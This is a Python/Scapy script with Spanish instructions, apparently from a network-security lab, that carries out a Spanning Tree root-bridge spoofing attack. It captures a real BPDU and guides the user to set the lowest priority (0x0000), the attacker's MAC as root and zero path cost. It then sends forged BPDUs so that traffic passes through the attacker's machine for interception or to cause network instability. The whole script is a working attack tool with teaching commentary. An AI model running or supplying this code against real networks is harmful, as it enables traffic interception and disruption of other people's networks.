#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import re

SEPARATOR = "\n" + "=" * 70 + "\n"


def ascii_banner(text):
    print("\n" + "=" * (len(text) + 4))
    print(f"| {text} |")
    print("=" * (len(text) + 4))


def intro():
    ascii_banner("\033[1;31mINICIO DEL ATAQUE SPANNING TREE\033[0m")
    print()
    print("\033[1;36m🔎 Paso 1:\033[0m Abre \033[1mWireshark\033[0m y selecciona la interfaz \033[1;33m'swX-p5-kaliX'\033[0m")
    print("        En esta interfaz se observan los paquetes \033[1mSpanning Tree\033[0m legítimos originados desde Kali.")
    print("        Es importante hacer un pequeño análisis y entender estos paquetes antes de suplantar el root bridge.")
    print()
    input("\033[1;32m🚀 Presiona ENTER cuando estés listo y Wireshark esté capturando...\033[0m")

def explain_mac_addresses(pkt):

    SEPARATOR = "\033[1;33m" + "=" * 80 + "\033[0m"

    print(SEPARATOR)
    print("\033[1;34m🔍 Vamos a capturar y analizar uno de los paquetes STP (Spanning Tree Protocol)\033[0m")
    print("\033[1;34m    que están siendo enviados por la interfaz seleccionada.\033[0m")
    print()
    print("\033[1;36m🎯 Objetivo:\033[0m Entender cómo se construye una BPDU y qué cambios hacer para lanzar un ataque STP efectivo.")
    print()
    print("\033[1;35mPara eso, necesitaremos identificar dos direcciones MAC clave:\033[0m")
    print("  \033[1;32m1️⃣\033[0m La MAC de la Kali en la interfaz \033[1m'swX-p5-kali'\033[0m")
    print("  \033[1;32m2️⃣\033[0m La MAC del switch legítimo conectado.")
    print()
    print("\033[1;36m▶ En Kali:\033[0m Ejecuta '\033[1mip link show\033[0m' y localiza la interfaz 'swF-p5-kali'.")
    print("\033[1;36m▶ En el switch:\033[0m Usa '\033[1mshow system\033[0m' para ver su MAC.")
    print()
    print("\033[1;34m📦 Analizando el paquete capturado:\033[0m")
    print(f"📤 \033[1;32mSOURCE      →\033[0m {pkt.src}  (MAC desde la cual se envió la BPDU — Kali)")
    print(f"📥 \033[1;32mDESTINATION →\033[0m {pkt.dst}  (Multicast STP: \033[1m01:80:c2:00:00:00\033[0m)")
    print("\033[1;90m🔁 Las BPDUs se envían a esa dirección multicast para que todos los switches del dominio STP las reciban.\033[0m")

    stp = pkt.getlayer(STP)
    root_mac = stp.rootmac
    print(f"🏛️  \033[1;36mROOT BRIDGE →\033[0m {stp.rootmac}")
    print("Esta es la MAC que se declara como switch raíz (root bridge).")
    print("\033[1;33m💡 En el ataque modificaremos esta MAC para fingir que nuestra Kali es el root bridge.\033[0m")
    print("\033[1;31m👉 Esto es esencial:\033[0m el root controla toda la topología de red: los caminos se construyen hacia él.")
    print()
    print("\033[1;31m⚠️ Si logramos que la Kali sea el ROOT, el tráfico de la red pasará por nuestro equipo.\033[0m")
    print("Esto permite interceptar, analizar o modificar paquetes legítimos.")

    print(SEPARATOR)
    print("\033[1;34m🔍 Una de las partes más importantes a la hora de hacer cambios en la BPDU va a ser tanto\033[0m")
    print("\033[1;34m    la prioridad como la dirección MAC del root bridge. En este caso buscaremos seleccionar\033[0m")
    print("\033[1;34m    la mayor prioridad poible y la MAC del atacante para interceptar los mensajes o una aleatoria\033[0m")
    print("\033[1;34m     para causar caos. Vamos con ello! \033[0m")
    print("\033[1;34m📘 ESTRUCTURA DEL CAMPO BRIDGE ID (Root ID y Bridge ID)\033[0m")
    print()
    print("El campo Bridge ID tiene 8 bytes totales:")
    print("  - 🧮 \033[1;32m2 bytes:\033[0m PRIORIDAD (manual + VLAN ID)")
    print("  - 🧾 \033[1;32m6 bytes:\033[0m MAC address del bridge")
    print()
    print("🔧 PRIORIDAD (16 bits) = [4 bits de prioridad manual] + [12 bits de VLAN ID]")
    print("  ▸ Se configura en múltiplos de 4096: \033[1m0x0000, 0x1000, ..., 0xF000\033[0m")
    print("  ▸ VLAN se añade automáticamente: VLAN 1 → 0x0001, VLAN 10 → 0x000A")
    print()
    print("📌 Ejemplo:")
    print("  \033[1;32m0x2000 (prioridad)\033[0m + \033[1;32m0x0001 (VLAN 1)\033[0m = \033[1;36m0x2001\033[0m")
    print()
    print("\033[1;35m📎 Nota:\033[0m En STP, cuanto más bajo sea el valor total, mayor prioridad tiene ese bridge.")
    print("\033[1;31m🔐 Por eso en el ataque se usará prioridad mínima (0x0000) + MAC falsa convincente.\033[0m")
    print(SEPARATOR)
    ascii_banner("\033[1;36mRESUMEN PAQUETE BPDU CAPTURADO\033[0m")




def prompt_or_suggest(field_name, current_val, suggested_val, bits_info, desc, reason):
    print(SEPARATOR)
    print(f"Campo: {field_name}")
    print(f"Bits:  {bits_info}")
    print(f"Descripción: {desc}")
    print(f"Valor actual: 0x{current_val:04x}")
    print(f"Sugerido:     0x{suggested_val:04x}  <- {reason}")
    choice = input("\n¿Quieres usar este valor sugerido? [S/n]: ").strip().lower()
    if choice == 'n':
        while True:
            user_input = input("Introduce el nuevo valor en hexadecimal (ej de formato 0x2000 -> 2000): ").strip()
            try:
                return int(user_input, 16)
            except ValueError:
                print("Valor no válido. Intenta de nuevo.")
    return suggested_val

def aplicar_modificaciones_base(pkt_base, pkt_modificado):
    """Aplica los campos modificados desde pkt_modificado a un nuevo paquete base (pkt_base)"""
    if not (pkt_base.haslayer(STP) and pkt_modificado.haslayer(STP)):
        #print("❌ Error: uno de los paquetes no tiene capa STP válida.")
        return pkt_base

    stp_base = pkt_base.getlayer(STP)
    stp_mod = pkt_modificado.getlayer(STP)

    stp_base.rootid    = stp_mod.rootid
    stp_base.rootmac   = stp_mod.rootmac
    stp_base.pathcost  = stp_mod.pathcost
    stp_base.bridgeid  = stp_mod.bridgeid
    stp_base.bridgemac = stp_mod.bridgemac

    return pkt_base


def is_valid_mac(mac):
    return re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) is not None

def prompt_hex_input(prompt_text, default_val):
    while True:
        user_input = input(prompt_text).strip()
        if user_input == '':
            return default_val
        try:
            val = int(user_input, 16)
            if 0x0000 <= val <= 0xFFFF:
                return val
            else:
                print("⚠️ Valor fuera de rango válido (0x0000 a 0xFFFF).")
        except ValueError:
            print("❌ Entrada no válida. Usa un número hexadecimal (ej de formato 0x2000 -> 2000).")
def modify_bpdu(pkt):
    if pkt.haslayer(Dot3) and pkt.haslayer(LLC) and pkt.haslayer(STP):
        stp = pkt.getlayer(STP)

        ascii_banner("\033[1;34m🎯 PAQUETE BPDU CAPTURADO\033[0m")
        explain_mac_addresses(pkt)
        stp.show()

        print(SEPARATOR)
        input("\n\033[1;36m💡 Pulsa ENTER para modificar los campos clave del ataque STP...\033[0m")

        stp.rootid = prompt_or_suggest(
            "\033[1;35mID del Root Bridge\033[0m",
            stp.rootid,
            0x0000,
            "16 bits (4 prioridad + 12 VLAN)",
            "Se utiliza para determinar la prioridad del bridge sugerido.",
            "Prioridad máxima para ser Root"
        )

        suggested_mac = pkt.src
        print(SEPARATOR)
        print("\033[1m📌 Campo:\033[0m MAC del Root Bridge")
        print("🔐 En un ataque real puedes usar la del atacante para MITM,")
        print("💥 o elegir otra para provocar inestabilidad en la red.")
        print(f"🧾 Valor actual: \033[1;37m{stp.rootmac}\033[0m")
        print(f"💡 Sugerido:     \033[1;32m{suggested_mac}\033[0m (MAC del atacante capturada)")

        choice = input("\n¿Quieres usar esta MAC como Root Bridge? [S/n]: ").strip().lower()
        if choice == 'n':
            while True:
                new_mac = input("Introduce la MAC que quieres usar (ej. aa:bb:cc:dd:ee:ff): ").strip()
                if is_valid_mac(new_mac):
                    stp.rootmac = new_mac
                    break
                else:
                    print("\033[1;31m❌ Formato de MAC inválido. Usa el formato aa:bb:cc:dd:ee:ff.\033[0m")
        else:
            stp.rootmac = suggested_mac

        stp.pathcost = prompt_or_suggest(
            "\033[1;35mPath Cost\033[0m",
            stp.pathcost,
            0x0000,
            "16 bits",
            "Costo acumulado al Root Bridge.",
            "0 indica conexión directa y prioridad máxima"
        )

        stp.bridgeid = 0x0000
        stp.bridgemac = suggested_mac

        ascii_banner("\033[1;32m✅ BPDU FINAL MODIFICADO\033[0m")
        stp.show()
        return pkt
    else:
        print("\033[1;31m❌ El paquete no es un BPDU válido.\033[0m")
        return None


def main():
    intro()

    if len(sys.argv) != 2:
        print(f"\nUso: {sys.argv[0]} <interfaz>")
        sys.exit(1)

    iface = sys.argv[1]
    print(f"\nCapturando paquete STP en interfaz {iface}...")

    pkts = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)
    pkt = pkts[0]

    modified_pkt = modify_bpdu(pkt.copy())

    if modified_pkt:
        input("\nPulsa ENTER para enviar el BPDU modificado...")

        for i in range(3):
            #print(f"🌐 Capturando paquete fresco #{i+1}...")
            pkt_fresco = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)[0]
            final_pkt = aplicar_modificaciones_base(pkt_fresco.copy(), modified_pkt)
            #print(f"📤 Enviando BPDU modificada #{i+1}...")
            sendp(final_pkt, iface=iface, verbose=True)
            time.sleep(1)

        ascii_banner("ATAQUE STP LANZADO")
        print("\033[1;36m🔍 Revisa en Wireshark los cambios de topología...\033[0m")
        print("\033[1;33m🛰️  Si eres rápido, podrás ver que el valor del \033[1mDesignated Root\033[0m ha cambiado en el switch.\033[0m")
        print("   Ejecuta el comando \033[1;32m'show stp s0'\033[0m para comprobarlo.")

        print("\n\033[1;36mℹ️  ¿Qué pasa si espras unos segundos y se dejan de enviar BPDUs maliciosos? (Este script manda un máximo de 3 bpdus maliciosas)\033[0m")
        print("   El switch deja de recibir tus anuncios como Root Bridge y, tras un tiempo, reelegirá otro Root válido en la red.")
        print("   El protocolo STP está diseñado para recuperarse automáticamente si no hay actividad del root anterior.")

        print("\n\033[1;33m❗ Repetir el ataque con una prioridad más alta no tendrá efecto.\033[0m")
        print("   En STP, las prioridades más \033[1mbajas\033[0m tienen mayor peso.")
        print("   Por eso, si intentas un nuevo ataque con un número de prioridad mayor (es decir, peor), será ignorado.")


    else:
        print("No se envió ningún paquete.")


if __name__ == "__main__":
    main()


